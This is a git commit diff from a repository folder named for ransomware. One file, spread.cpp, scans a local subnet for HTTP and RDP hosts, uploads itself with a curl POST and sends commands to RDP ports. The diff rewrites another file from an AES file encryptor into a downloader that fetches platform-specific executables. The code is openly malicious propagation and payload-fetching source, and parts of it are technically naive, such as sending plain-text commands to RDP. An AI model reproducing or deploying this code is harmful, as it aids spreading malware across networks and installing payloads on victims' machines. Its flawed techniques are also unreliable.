55487ab98ddcbe6efe6870e51fe4da3dc7bfa758
SergioZ3R0 <sergio.scs388@gmail.com>
2024-09-25 12:39:42 +0200

    Update

--- cyberSec/C+Randsomware/spread.cpp
+++ cyberSec/C+Randsomware/spread.cpp
@@ -1,3 +1,78 @@
 //Make the spread.py file on c++
 
+#include <iostream>
+#include <vector>
+#include <string>
+#include <cstdlib>
+#include <boost/asio.hpp>
+#include <boost/process.hpp>
 
+using namespace std;
+using namespace boost::asio;
+using namespace boost::process;
+
+vector<string> scan_network_for_http(const string& network_prefix) {
+    vector<string> open_http_hosts;
+    for (int i = 1; i < 255; ++i) {
+        string ip = network_prefix + "." + to_string(i);
+        ip::tcp::iostream stream(ip, "80");
+        if (stream) {
+            open_http_hosts.push_back(ip);
+        }
+    }
+    return open_http_hosts;
+}
+
+void upload_script_to_http(const string& host, const string& script_path) {
+    string command = "curl -X POST --data-binary @" + script_path + " http://" + host + "/upload";
+    system(command.c_str());
+}
+
+vector<string> scan_network_for_rdp(const string& network_prefix) {
+    vector<string> open_rdp_hosts;
+    for (int i = 1; i < 255; ++i) {
+        string ip = network_prefix + "." + to_string(i);
+        try {
+            ip::tcp::iostream stream(ip, "3389");
+            if (stream) {
+                open_rdp_hosts.push_back(ip);
+            }
+        } catch (...) {
+            // Ignore exceptions
+        }
+    }
+    return open_rdp_hosts;
+}
+
+void execute_command_on_rdp(const string& host, const string& command) {
+    try {
+        ip::tcp::iostream stream(host, "3389");
+        if (stream) {
+            stream << command << endl;
+            string response;
+            while (getline(stream, response)) {
+                cout << response << endl;
+            }
+        }
+    } catch (const std::exception& e) {
+        cerr << "Error executing command on " << host << ": " << e.what() << endl;
+    }
+}
+
+int main() {
+    string network_prefix = "192.168.1";
+
+    // Scan for HTTP hosts and upload script
+    vector<string> open_http_hosts = scan_network_for_http(network_prefix);
+    for (const auto& host : open_http_hosts) {
+        upload_script_to_http(host, "spread.cpp");
+    }
+
+    // Scan for RDP hosts and execute command
+    vector<string> open_rdp_hosts = scan_network_for_rdp(network_prefix);
+    for (const auto& host : open_rdp_hosts) {
+        execute_command_on_rdp(host, "echo 'Hello from RDP'");
+    }
+
+    return 0;
+}
--- cyberSec/C+Randsomware/voldemort.cpp
+++ cyberSec/C+Randsomware/voldemort.cpp
@@ -1,104 +1,80 @@
-#Make a C+ or c++ program that encrypts a file using a AES encryption algorithm.
-#The program should take the file name as an argument and encrypt the file.
-#The program should also take a password as an argument and use the password to encrypt the file.
-#The program should output the encrypted file to a file with the same name as the input file but with a .enc extension.
-#The program should also output the key used to encrypt the file to a file with the same name as the input file but with a .key extension.
-
 #include <iostream>
 #include <fstream>
+#include <stdexcept>
 #include <string>
-#include <openssl/aes.h>
-#include <openssl/rand.h>
-#include <openssl/evp.h>
-#include <openssl/err.h>
-#include <openssl/conf.h>
-#include <openssl/err.h>
-#include <openssl/evp.h>
+#include <cstdlib>
+#include <sys/utsname.h>
+#include <curl/curl.h>
 
 using namespace std;
 
-void handleErrors(void)
-{
-    ERR_print_errors_fp(stderr);
-    abort();
+struct SystemInfo {
+    string system;
+    string arch;
+};
+
+SystemInfo get_system_info() {
+    struct utsname buffer;
+    if (uname(&buffer) != 0) {
+        throw runtime_error("Unable to get system information");
+    }
+    return {buffer.sysname, buffer.machine};
 }
 
-int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
-            unsigned char *iv, unsigned char *ciphertext)
-{
-    EVP_CIPHER_CTX *ctx;
-
-    int len;
-
-    int ciphertext_len;
-
-    if (!(ctx = EVP_CIPHER_CTX_new()))
-        handleErrors();
-
-    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
-        handleErrors();
-
-    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
-        handleErrors();
-    ciphertext_len = len;
-
-    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
-        handleErrors();
-    ciphertext_len += len;
-
-    EVP_CIPHER_CTX_free(ctx);
-
-    return ciphertext_len;
+size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream) {
+    size_t written = fwrite(ptr, size, nmemb, stream);
+    return written;
 }
 
-int main(int argc, char *argv[])
-{
-    if (argc != 3)
-    {
-        cout << "Usage: " << argv[0] << " <file> <password>" << endl;
-        return 1;
+void download_executable(const string& system, const string& arch) {
+    string base_url = "https://example.com/downloads/";
+    string url;
+
+    if (system == "Linux") {
+        if (arch == "x86_64") {
+            url = base_url + "my_program_linux_x86_64";
+        } else if (arch == "aarch64") {
+            url = base_url + "my_program_linux_aarch64";
+        } else {
+            throw runtime_error("Unsupported architecture");
+        }
+    } else if (system == "Windows") {
+        url = base_url + "my_program_windows.exe";
+    } else if (system == "Darwin") {
+        url = base_url + "my_program_mac";
+    } else {
+        throw runtime_error("Unsupported operating system");
     }
 
-    string file = argv[1];
-    string password = argv[2];
+    CURL* curl;
+    FILE* fp;
+    CURLcode res;
+    string filename = url.substr(url.find_last_of("/") + 1);
 
-    ifstream in(file, ios::binary);
-    if (!in)
-    {
-        cout << "Error opening file: " << file << endl;
-        return 1;
+    curl = curl_easy_init();
+    if (curl) {
+        fp = fopen(filename.c_str(), "wb");
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        fclose(fp);
+
+        if (res == CURLE_OK) {
+            cout << "Downloaded " << filename << endl;
+        } else {
+            cout << "Failed to download " << filename << endl;
+        }
     }
+}
 
-    in.seekg(0, ios::end);
-    int plaintext_len = in.tellg();
-    in.seekg(0, ios::beg);
-
-    unsigned char *plaintext = new unsigned char[plaintext_len];
-    in.read((char *)plaintext, plaintext_len);
-    in.close();
-
-    unsigned char key[32];
-    unsigned char iv[16];
-
-    RAND_bytes(key, 32);
-    RAND_bytes(iv, 16);
-
-    unsigned char *ciphertext = new unsigned char[plaintext_len + AES_BLOCK_SIZE];
-
-    int ciphertext_len = encrypt(plaintext, plaintext_len, key, iv, ciphertext);
-
-    string enc_file = file + ".enc";
-    ofstream out(enc_file, ios::binary);
-    out.write((char *)ciphertext, ciphertext_len);
-    out.close();
-
-    string key_file = file + ".key";
-    out.open(key_file, ios::binary);
-    out.write((char *)key, 32);
-    out.close();
-
-    delete[] plaintext;
-    delete[] ciphertext;
-
+int main() {
+    try {
+        SystemInfo system_info = get_system_info();
+        download_executable(system_info.system, system_info.arch);
+    } catch (const exception& e) {
+        cerr << e.what() << endl;
+    }
     return 0;
 }
